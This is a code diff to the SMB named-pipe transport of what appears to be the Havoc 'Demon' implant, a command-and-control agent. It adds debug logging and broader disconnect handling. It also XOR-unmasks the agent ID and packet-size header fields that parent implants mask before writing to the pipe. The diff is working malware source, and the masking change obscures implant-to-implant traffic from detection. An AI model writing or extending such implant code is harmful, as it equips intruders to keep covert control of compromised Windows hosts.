@@ -7,6 +7,8 @@
 
 BOOL SmbSend( PBUFFER Send )
 {
+    PRINTF( "SmbSend: len=0x%x handle=%p\n", Send->Length, Instance->Config.Transport.Handle )
+
     if ( ! Instance->Config.Transport.Handle )
     {
         SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
@@ -45,18 +47,16 @@ BOOL SmbSend( PBUFFER Send )
     {
         PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );
 
-        /* Means that the client disconnected/the pipe is closing. */
-        if ( NtGetLastError() == ERROR_NO_DATA )
+        /* Any write failure (ERROR_NO_DATA, ERROR_BROKEN_PIPE, etc.) means
+         * the client disconnected or the pipe is being closed. */
+        if ( Instance->Config.Transport.Handle )
         {
-            if ( Instance->Config.Transport.Handle )
-            {
-                SysNtClose( Instance->Config.Transport.Handle );
-                Instance->Config.Transport.Handle = NULL;
-            }
-
-            Instance->Session.Connected = FALSE;
-            return FALSE;
+            SysNtClose( Instance->Config.Transport.Handle );
+            Instance->Config.Transport.Handle = NULL;
         }
+
+        Instance->Session.Connected = FALSE;
+        return FALSE;
     }
 
     return TRUE;
@@ -68,8 +68,11 @@ BOOL SmbRecv( PBUFFER Resp )
     DWORD DemonId     = 0;
     DWORD PackageSize = 0;
 
+    PRINTF( "SmbRecv: polling pipe handle=%p\n", Instance->Config.Transport.Handle )
+
     if ( Instance->Win32.PeekNamedPipe( Instance->Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
     {
+        PRINTF( "SmbRecv: bytes available in pipe = 0x%x\n", BytesSize )
         if ( BytesSize > sizeof( UINT32 ) + sizeof( UINT32 ) )
         {
             if ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
@@ -80,6 +83,12 @@ BOOL SmbRecv( PBUFFER Resp )
                 Instance->Session.Connected = FALSE;
                 return FALSE;
             }
+
+            /* [HVC-008 2026-03-28] Unmask the DemonID framing field. The parent Demon
+             * applied HEADER_MASK_SEED before writing to the pipe. */
+            PRINTF( "SmbRecv: raw DemonId from pipe = 0x%x (masked)\n", DemonId )
+            DemonId ^= HEADER_MASK_SEED;
+            PRINTF( "SmbRecv: unmasked DemonId = 0x%x, expected AgentID = 0x%x\n", DemonId, Instance->Session.AgentID )
 
             if ( Instance->Session.AgentID != DemonId )
             {
@@ -99,8 +108,21 @@ BOOL SmbRecv( PBUFFER Resp )
                 return FALSE;
             }
 
+            /* [HVC-008 2026-03-28] Unmask the PackageSize framing field. */
+            PRINTF( "SmbRecv: raw PackageSize from pipe = 0x%x (masked)\n", PackageSize )
+            PackageSize ^= ( HEADER_MASK_SEED >> 8 );
+            PRINTF( "SmbRecv: unmasked PackageSize = 0x%x\n", PackageSize )
+
             Resp->Buffer = Instance->Win32.LocalAlloc( LPTR, PackageSize );
             Resp->Length = PackageSize;
+
+            if ( ! Resp->Buffer )
+            {
+                PRINTF( "SmbRecv: LocalAlloc(%d) failed\n", PackageSize )
+                Resp->Length = 0;
+                Instance->Session.Connected = FALSE;
+                return FALSE;
+            }
 
             if ( ! PipeRead( Instance->Config.Transport.Handle, Resp ) )
             {
@@ -115,7 +137,7 @@ BOOL SmbRecv( PBUFFER Resp )
                 Instance->Session.Connected = FALSE;
                 return FALSE;
             }
-            //PRINTF("successfully read 0x%x bytes from pipe\n", PackageSize)
+            PRINTF( "SmbRecv: successfully read 0x%x payload bytes from pipe\n", PackageSize )
         }
         else if ( BytesSize > 0 )
         {
